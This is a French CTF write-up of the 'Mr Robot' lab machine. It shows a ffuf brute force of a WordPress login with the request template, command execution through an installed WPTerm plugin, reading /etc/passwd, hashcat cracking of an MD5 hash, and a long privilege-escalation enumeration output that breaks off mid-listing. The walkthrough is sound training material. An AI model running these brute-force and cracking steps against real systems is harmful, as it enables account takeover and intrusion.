<!DOCTYPE html>
<html lang="fr-fr" dir="ltr">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <!--
Made with Book Theme
https://github.com/alex-shpak/hugo-book
-->

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="Mr Robot# Reconnaissance# La machine Mr. Robot est disponible sur plusieurs plateforme (Vulnhub, TryHackMe Root me…) . Cette machine nous demande de récupérer 3 drapeaux.
Acces a l’application# On accede à l’application depuis le port HTTP. A partir de là l’application se présente comme un terminal. quelques options sont disponible mais l’application nous montre majoritairement des videos et du texte.
En utilisant gobuster on s’aperçoit également que l’application est en fait un site wordpress.
">
<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#343a40">
<meta name="color-scheme" content="light dark"><meta property="og:url" content="http://localhost:1313/docs/writeups/vm/collapsed/mrrobot/">
  <meta property="og:site_name" content="Blog de @camillegr">
  <meta property="og:title" content="Mr Robot">
  <meta property="og:description" content="Mr Robot# Reconnaissance# La machine Mr. Robot est disponible sur plusieurs plateforme (Vulnhub, TryHackMe Root me…) . Cette machine nous demande de récupérer 3 drapeaux.
Acces a l’application# On accede à l’application depuis le port HTTP. A partir de là l’application se présente comme un terminal. quelques options sont disponible mais l’application nous montre majoritairement des videos et du texte.
En utilisant gobuster on s’aperçoit également que l’application est en fait un site wordpress.">
  <meta property="og:locale" content="fr_fr">
  <meta property="og:type" content="article">
    <meta property="article:section" content="docs">


  <meta itemprop="name" content="Mr Robot">
  <meta itemprop="description" content="Mr Robot# Reconnaissance# La machine Mr. Robot est disponible sur plusieurs plateforme (Vulnhub, TryHackMe Root me…) . Cette machine nous demande de récupérer 3 drapeaux.
Acces a l’application# On accede à l’application depuis le port HTTP. A partir de là l’application se présente comme un terminal. quelques options sont disponible mais l’application nous montre majoritairement des videos et du texte.
En utilisant gobuster on s’aperçoit également que l’application est en fait un site wordpress.">
  <meta itemprop="wordCount" content="1696">

<title>Mr Robot | Blog de @camillegr</title>
<link rel="icon" href="/favicon.png" >
<link rel="manifest" href="/manifest.json">
<link rel="canonical" href="http://localhost:1313/docs/writeups/vm/collapsed/mrrobot/">
<link rel="stylesheet" href="/book.min.8be08ee19c78fece5778ccbad7b7920c47943153ee0c9e856094873c56dca415.css" integrity="sha256-i&#43;CO4Zx4/s5XeMy617eSDEeUMVPuDJ6FYJSHPFbcpBU=" crossorigin="anonymous">


  <script defer src="/fuse.min.js"></script>
  <script defer src="/en.search.min.7399875a2486e099b239f0f50cde8897568f15dc5a1f7fe55cc2fe34bfa35a6e.js" integrity="sha256-c5mHWiSG4JmyOfD1DN6Il1aPFdxaH3/lXML&#43;NL&#43;jWm4=" crossorigin="anonymous"></script>



  
</head>
<body dir="ltr" class="book-kind-page book-type-docs">
  <input type="checkbox" class="hidden toggle" id="menu-control" />
  <input type="checkbox" class="hidden toggle" id="toc-control" />
  <main class="container flex">
    
<aside class="book-menu">
  <div class="book-menu-content">
    
  <nav>
<h2 class="book-brand">
  <a class="flex align-center" href="/"><span>Blog de @camillegr</span>
  </a>
</h2>


<div class="book-search hidden">
  <input id="book-search-input" type="text" 
    placeholder="Search"
    aria-label="Search"
    maxlength="64" data-hotkeys="s/" />
  <div class="book-search-spinner hidden"></div>
  <ul id="book-search-results"></ul>
</div>
<script>document.querySelector(".book-search").classList.remove("hidden")</script>













  
  <ul>
    
      
        <li>
          
  
  

  
    <input type="checkbox" id="section-ba5e9fca78bb6e1afcafc6aba970bb3e" class="toggle"  />
    <label for="section-ba5e9fca78bb6e1afcafc6aba970bb3e" class="flex">
      <a role="button" class="">
        Projets Personnels</a>
      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
    </label>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/docs/projets/collapsed/tofuzz/" class="">
      ToFuzz</a>
  

        </li>
      
    
  </ul>

        </li>
      
    
      
        <li>
          
  
  

  
    <input type="checkbox" id="section-c4ed5b609d03974b5783bb2c6341f2bf" class="toggle" checked />
    <label for="section-c4ed5b609d03974b5783bb2c6341f2bf" class="flex">
      <a href="/docs/writeups/" class="">
        Writeups</a>
      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
    </label>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <input type="checkbox" id="section-3ec5a319b7889f85b1f653793946f6b8" class="toggle"  />
    <label for="section-3ec5a319b7889f85b1f653793946f6b8" class="flex">
      <a href="/docs/writeups/rootmepro2025/" class="">
        CTF 2025 | Root-Me Pro x DGSE</a>
      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
    </label>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/docs/writeups/rootmepro2025/collapsed/mission1/" class="">
      Mission 1 - IA</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/writeups/rootmepro2025/collapsed/mission2/" class="">
      Mission 2 - SOC</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/writeups/rootmepro2025/collapsed/mission3/" class="">
      Mission 3 - Forensic</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/writeups/rootmepro2025/collapsed/mission4/" class="">
      Mission 4 - Pentest</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/writeups/rootmepro2025/collapsed/mission5/" class="">
      Mission 5 - Mobile</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/writeups/rootmepro2025/collapsed/mission6/" class="">
      Mission 6 - OSINT</a>
  

        </li>
      
    
  </ul>

        </li>
      
    
      
        <li>
          
  
  

  
    <input type="checkbox" id="section-668a8f1963104d8c2a2b28ecf8acf587" class="toggle" checked />
    <label for="section-668a8f1963104d8c2a2b28ecf8acf587" class="flex">
      <a href="/docs/writeups/vm/" class="">
        Virtual Machines</a>
      <img src="/icons/chevron-right.svg" class="book-icon" alt="Expand" />
    </label>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/docs/writeups/vm/collapsed/hammer/" class="">
      Hammer</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/writeups/vm/collapsed/mrrobot/" class="active">
      Mr Robot</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/writeups/vm/collapsed/rootme/" class="">
      RootMe</a>
  

        </li>
      
    
      
        <li>
          
  
  

  
    <a href="/docs/writeups/vm/collapsed/wonderlands/" class="">
      Wonderlands</a>
  

        </li>
      
    
  </ul>

        </li>
      
    
  </ul>

        </li>
      
    
      
        <li class="book-section-flat" >
          
  
  

  
    <a>
      Divers</a>
  

          
  <ul>
    
      
        <li>
          
  
  

  
    <a href="/docs/divers/blogs/" class="">
      Blogs</a>
  

        </li>
      
    
  </ul>

        </li>
      
    
  </ul>













</nav>




  <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>



  </div>
</aside>
 

    <div class="book-page">
      <header class="book-header hidden">
        
  <div class="flex align-center justify-between">
  <label for="menu-control">
    <img src="/icons/menu.svg" class="book-icon" alt="Menu" />
  </label>

  <h3>Mr Robot</h3>

  <label for="toc-control">
    
    <img src="/icons/toc.svg" class="book-icon" alt="Table of Contents" />
    
  </label>
</div>


  
  <aside class="hidden">
    
  
<nav id="TableOfContents">
  <ul>
    <li><a href="#mr-robot">Mr Robot</a>
      <ul>
        <li><a href="#reconnaissance">Reconnaissance</a></li>
        <li><a href="#acces-a-lapplication">Acces a l&rsquo;application</a>
          <ul>
            <li><a href="#robotstxt">robots.txt</a></li>
            <li><a href="#fuzzing--bruteforce">Fuzzing &amp; Bruteforce</a></li>
          </ul>
        </li>
        <li><a href="#shell">Shell</a>
          <ul>
            <li><a href="#wordpress-plugin">Wordpress Plugin</a></li>
            <li><a href="#utilisateur-robot">Utilisateur robot</a></li>
            <li><a href="#hashcat">Hashcat</a></li>
          </ul>
        </li>
        <li><a href="#escalade-de-privilege">Escalade de privilege</a>
          <ul>
            <li><a href="#enumeration-avec-les">Enumeration avec LES</a></li>
            <li><a href="#dirtycow">Dirtycow</a></li>
          </ul>
        </li>
      </ul>
    </li>
  </ul>
</nav>



  </aside>
  
 
      </header>

      
      
  <article class="markdown book-article"><h1 id="mr-robot">Mr Robot<a class="anchor" href="#mr-robot">#</a></h1>
<p><img src="../img/mrrobot_illu.png" alt="Screenshot de l&rsquo;application" /></p>
<h2 id="reconnaissance">Reconnaissance<a class="anchor" href="#reconnaissance">#</a></h2>
<p>La machine Mr. Robot est disponible sur plusieurs plateforme (Vulnhub, TryHackMe Root me&hellip;) . Cette machine nous demande de récupérer 3 drapeaux.</p>
<h2 id="acces-a-lapplication">Acces a l&rsquo;application<a class="anchor" href="#acces-a-lapplication">#</a></h2>
<p>On accede à l&rsquo;application depuis le port HTTP. A partir de là l&rsquo;application se présente comme un terminal. quelques options sont disponible mais l&rsquo;application nous montre majoritairement des videos et du texte.</p>
<p>En utilisant gobuster on s&rsquo;aperçoit également que l&rsquo;application est en fait un site wordpress.</p>
<h3 id="robotstxt">robots.txt<a class="anchor" href="#robotstxt">#</a></h3>
<p>en fouillant un petit peu on trouve rapidement le robots.txt qui contient notre premier drapeau mais également un dictionnaire .dic.</p>
<h3 id="fuzzing--bruteforce">Fuzzing &amp; Bruteforce<a class="anchor" href="#fuzzing--bruteforce">#</a></h3>
<p>Sur notre site wordpress, on utilise la fonctionnalité &ldquo;Mot de passe oublié&rdquo; pour essayer de trouver un utilisateur existant. En se servant des noms des personnages de la série on trouve que &ldquo;Elliot&rdquo; est utilisateur.</p>
<p>On lance alors ffuf et on trouve le mot de passe.</p>
<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -request login.txt -w uniquedic.dic -t <span style="color:#ff9f43">200</span> -o fuzzResult  -fl <span style="color:#ff9f43">59</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#57c7ff">POST</span> /wp-login.php <span style="color:#ff6ac1">HTTP</span><span style="color:#ff6ac1">/</span><span style="color:#ff9f43">1.1</span>
</span></span><span style="display:flex;"><span>Host<span style="color:#ff6ac1">:</span> ctf04.root-me.org
</span></span><span style="display:flex;"><span>Content-Length<span style="color:#ff6ac1">:</span> 106
</span></span><span style="display:flex;"><span>Referer<span style="color:#ff6ac1">:</span> http://ctf04.root-me.org/wp-login.php
</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#ff6ac1">:</span> gzip, deflate, br
</span></span><span style="display:flex;"><span>Cookie<span style="color:#ff6ac1">:</span> xxxxx
</span></span><span style="display:flex;"><span>Connection<span style="color:#ff6ac1">:</span> keep-alive
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>log=Elliot&amp;pwd=FUZZ&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2Fctf04.root-me.org%2Fwp-admin%2F&amp;testcookie=1%</span></span></code></pre></div><p><img src="../img/mrrobot_fuzzing.png" alt="fuzzing" /></p>
<p>On obtient le mot de passe : &ldquo;ER28-0652&rdquo;.</p>
<h2 id="shell">Shell<a class="anchor" href="#shell">#</a></h2>
<h3 id="wordpress-plugin">Wordpress Plugin<a class="anchor" href="#wordpress-plugin">#</a></h3>
<p>Il se trouve qu&rsquo;Elliot est administrateur du site wordpress. On va donc installer un plugin qui nous permettra d&rsquo;executer des commandes sur la machine. On installe donc le plugin WPTerm. Après ça on peut récupérer un terminal et lister les utilisateurs via le fichier /etc/passwd</p>
<p><img src="../img/mrrobot_passwd.png" alt="passwd" /></p>
<h3 id="utilisateur-robot">Utilisateur robot<a class="anchor" href="#utilisateur-robot">#</a></h3>
<p>Une fois sur le terminal, on liste les utilisateurs en vérifiant le fichier /etc/passwd. On s&rsquo;aperçoit qu&rsquo;il y a un utilisateur robot. Cet utilisateur a un fichier password.raw-md5 dans son dossier utilisateur.</p>
<h3 id="hashcat">Hashcat<a class="anchor" href="#hashcat">#</a></h3>
<p>On utilise hashcat pour essayer de trouver le mot de passe correspondant :</p>
<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>hashcat -a <span style="color:#ff9f43">0</span> -m <span style="color:#ff9f43">0</span> <span style="color:#ff5c57">hash</span> /usr/share/wordlists/rockyou.txt</span></span></code></pre></div><p><img src="../img/mrrobot_hashcat.png" alt="passwd" /></p>
<p>on trouve le mot de passe &ldquo;abcdefghijklmnopqstruvwxyz&rdquo;. dans robot on trouve egalement notre deuxième drapeau.</p>
<h2 id="escalade-de-privilege">Escalade de privilege<a class="anchor" href="#escalade-de-privilege">#</a></h2>
<p>Après une énumération manuelle on voit qu&rsquo;il n&rsquo;y pas moyen d&rsquo;exploiter de failles de sudo ni d&rsquo;exploiter les fichiers de l&rsquo;utilisateur. On passe à une énumération automatisée.</p>
<h3 id="enumeration-avec-les">Enumeration avec LES<a class="anchor" href="#enumeration-avec-les">#</a></h3>
<details ><summary>Enumeration LES</summary><div class="markdown-inner">
<div class="highlight"><pre tabindex="0" style="color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span> ./lse.sh
</span></span><span style="display:flex;"><span>---
</span></span><span style="display:flex;"><span>If you know the current user password, write it here to check sudo privileges: abcdefghijklmnopqrstuvwxyz
</span></span><span style="display:flex;"><span>---
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> LSE Version: 4.14nw
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        User: robot
</span></span><span style="display:flex;"><span>     User ID: <span style="color:#ff9f43">1002</span>
</span></span><span style="display:flex;"><span>    Password: ******
</span></span><span style="display:flex;"><span>        Home: /home/robot
</span></span><span style="display:flex;"><span>        Path: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
</span></span><span style="display:flex;"><span>       umask: <span style="color:#ff9f43">0002</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    Hostname: linux
</span></span><span style="display:flex;"><span>       Linux: 3.13.0-55-generic
</span></span><span style="display:flex;"><span>Distribution: Ubuntu 14.04.2 LTS
</span></span><span style="display:flex;"><span>Architecture: <span style="color:#ff5c57">x86_64</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">=====================(</span> Current Output Verbosity Level: <span style="color:#ff9f43">0</span> <span style="color:#ff6ac1">)======================</span>
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">===============================================================(</span> humanity <span style="color:#ff6ac1">)=====</span>
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>!<span style="color:#ff6ac1">]</span> nowar0 Should we question autocrats and their <span style="color:#5af78e">&#34;military operations&#34;</span>?... yes!
</span></span><span style="display:flex;"><span>---
</span></span><span style="display:flex;"><span>                                      NO
</span></span><span style="display:flex;"><span>                                      WAR
</span></span><span style="display:flex;"><span>---
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">==================================================================(</span> users <span style="color:#ff6ac1">)=====</span>
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>i<span style="color:#ff6ac1">]</span> usr000 Current user groups............................................. yes!
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>*<span style="color:#ff6ac1">]</span> usr010 Is current user in an administrative group?..................... nope
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>*<span style="color:#ff6ac1">]</span> usr020 Are there other users in administrative groups?................. yes!
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>*<span style="color:#ff6ac1">]</span> usr030 Other users with shell.......................................... yes!
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>i<span style="color:#ff6ac1">]</span> usr040 Environment information......................................... skip
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>i<span style="color:#ff6ac1">]</span> usr050 Groups <span style="color:#ff6ac1">for</span> other users.......................................... skip
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>i<span style="color:#ff6ac1">]</span> usr060 Other users..................................................... skip
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>*<span style="color:#ff6ac1">]</span> usr070 PATH variables defined inside /etc.............................. yes!
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>!<span style="color:#ff6ac1">]</span> usr080 Is <span style="color:#5af78e">&#39;.&#39;</span> in a PATH variable defined inside /etc?.................. <span style="color:#ff5c57">nope</span>
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">===================================================================(</span> sudo <span style="color:#ff6ac1">)=====</span>
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>!<span style="color:#ff6ac1">]</span> sud000 Can we sudo without a password?................................. nope
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>!<span style="color:#ff6ac1">]</span> sud010 Can we list sudo commands without a password?................... nope
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>!<span style="color:#ff6ac1">]</span> sud020 Can we sudo with a password?.................................... nope
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>!<span style="color:#ff6ac1">]</span> sud030 Can we list sudo commands with a password?...................... nope
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>*<span style="color:#ff6ac1">]</span> sud040 Can we <span style="color:#ff5c57">read</span> sudoers files?...................................... nope
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>*<span style="color:#ff6ac1">]</span> sud050 Do we know <span style="color:#ff6ac1">if</span> any other users used sudo?........................ <span style="color:#ff5c57">nope</span>
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">============================================================(</span> file system <span style="color:#ff6ac1">)=====</span>
</span></span><span style="display:flex;"><span><span style="color:#ff6ac1">[</span>*<span style="color:#ff6ac1">]</span> fst000 Writable files outside user<span style="color:#5af78e">&#39;s home.............................. yes!
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[*] fst010 Binaries with setuid bit........................................ yes!
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[!] fst020 Uncommon setuid binaries........................................ yes!
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">---
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">/usr/local/bin/nmap
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">---
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[!] fst030 Can we write to any setuid binary?.............................. nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[*] fst040 Binaries with setgid bit........................................ skip
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[!] fst050 Uncommon setgid binaries........................................ skip
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[!] fst060 Can we write to any setgid binary?.............................. skip
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[*] fst070 Can we read /root?.............................................. nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[*] fst080 Can we read subdirectories under /home?......................... nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[*] fst090 SSH files in home directories................................... nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[*] fst100 Useful binaries................................................. yes!
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[*] fst110 Other interesting files in home directories..................... nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[!] fst120 Are there any credentials in fstab/mtab?........................ nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[*] fst130 Does &#39;</span>robot<span style="color:#5af78e">&#39; have mail?......................................... nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[!] fst140 Can we access other users mail?................................. nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[*] fst150 Looking for GIT/SVN repositories................................ yes!
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[!] fst160 Can we write to critical files?................................. nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[!] fst170 Can we write to critical directories?........................... nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[!] fst180 Can we write to directories from PATH defined in /etc?.......... nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[!] fst190 Can we read any backup?......................................... nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[!] fst200 Are there possible credentials in any shell history file?....... nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[!] fst210 Are there NFS exports with &#39;</span>no_root_squash<span style="color:#5af78e">&#39; option?............. nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[*] fst220 Are there NFS exports with &#39;</span>no_all_squash<span style="color:#5af78e">&#39; option?.............. nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[i] fst500 Files owned by user &#39;</span>robot<span style="color:#5af78e">&#39;..................................... skip
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[i] fst510 SSH files anywhere.............................................. skip
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[i] fst520 Check hosts.equiv file and its contents......................... skip
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[i] fst530 List NFS server shares.......................................... skip
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[i] fst540 Dump fstab file................................................. skip
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">=================================================================( system )=====
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[i] sys000 Who is logged in................................................ skip
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[i] sys010 Last logged in users............................................ skip
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[!] sys020 Does the /etc/passwd have hashes?............................... nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[!] sys022 Does the /etc/group have hashes?................................ nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[!] sys030 Can we read shadow files?....................................... nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[*] sys040 Check for other superuser accounts.............................. nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[*] sys050 Can root user log in via SSH?................................... yes!
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[i] sys060 List available shells........................................... skip
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[i] sys070 System umask in /etc/login.defs................................. skip
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[i] sys080 System password policies in /etc/login.defs..................... skip
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">===============================================================( security )=====
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[*] sec000 Is SELinux present?............................................. nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[*] sec010 List files with capabilities.................................... nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[!] sec020 Can we write to a binary with caps?............................. nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[!] sec030 Do we have all caps in any binary?.............................. nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[*] sec040 Users with associated capabilities.............................. nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[!] sec050 Does current user have capabilities?............................ skip
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[!] sec060 Can we read the auditd log?..................................... nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">========================================================( recurrent tasks )=====
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[*] ret000 User crontab.................................................... nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[!] ret010 Cron tasks writable by user..................................... nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[*] ret020 Cron jobs....................................................... yes!
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[*] ret030 Can we read user crontabs....................................... nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[*] ret040 Can we list other user cron tasks?.............................. nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[*] ret050 Can we write to any paths present in cron jobs.................. nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[!] ret060 Can we write to executable paths present in cron jobs........... skip
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[i] ret400 Cron files...................................................... skip
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[*] ret500 User systemd timers............................................. nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[!] ret510 Can we write in any system timer?............................... nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[i] ret900 Systemd timers.................................................. skip
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">================================================================( network )=====
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[*] net000 Services listening only on localhost............................ yes!
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[!] net010 Can we sniff traffic with tcpdump?.............................. nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[i] net500 NIC and IP information.......................................... skip
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[i] net510 Routing table................................................... skip
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[i] net520 ARP table....................................................... skip
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[i] net530 Nameservers..................................................... skip
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[i] net540 Systemd Nameservers............................................. skip
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[i] net550 Listening TCP................................................... skip
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[i] net560 Listening UDP................................................... skip
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">===============================================================( services )=====
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[!] srv000 Can we write in service files?.................................. nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[!] srv010 Can we write in binaries executed by services?.................. nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[*] srv020 Files in /etc/init.d/ not belonging to root..................... nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[*] srv030 Files in /etc/rc.d/init.d not belonging to root................. nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[*] srv040 Upstart files not belonging to root............................. nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[*] srv050 Files in /usr/local/etc/rc.d not belonging to root.............. nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[i] srv400 Contents of /etc/inetd.conf..................................... skip
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[i] srv410 Contents of /etc/xinetd.conf.................................... skip
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[i] srv420 List /etc/xinetd.d if used...................................... skip
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[i] srv430 List /etc/init.d/ permissions................................... skip
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[i] srv440 List /etc/rc.d/init.d permissions............................... skip
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[i] srv450 List /usr/local/etc/rc.d permissions............................ skip
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[i] srv460 List /etc/init/ permissions..................................... skip
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[!] srv500 Can we write in systemd service files?.......................... nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[!] srv510 Can we write in binaries executed by systemd services?.......... nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[*] srv520 Systemd files not belonging to root............................. nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[i] srv900 Systemd config files permissions................................ skip
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">===============================================================( software )=====
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[!] sof000 Can we connect to MySQL with root/root credentials?............. nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[!] sof010 Can we connect to MySQL as root without password?............... nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[!] sof015 Are there credentials in mysql_history file?.................... nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[!] sof020 Can we connect to PostgreSQL template0 as postgres and no pass?. nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[!] sof020 Can we connect to PostgreSQL template1 as postgres and no pass?. nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[!] sof020 Can we connect to PostgreSQL template0 as psql and no pass?..... nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[!] sof020 Can we connect to PostgreSQL template1 as psql and no pass?..... nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[*] sof030 Installed apache modules........................................ nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[!] sof040 Found any .htpasswd files?...................................... nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[!] sof050 Are there private keys in ssh-agent?............................ nope
</span></span></span><span style="display:flex;"><span><span style="color:#5af78e">[!] sof060 Are there gpg keys cached in gpg-agent?......................... nope
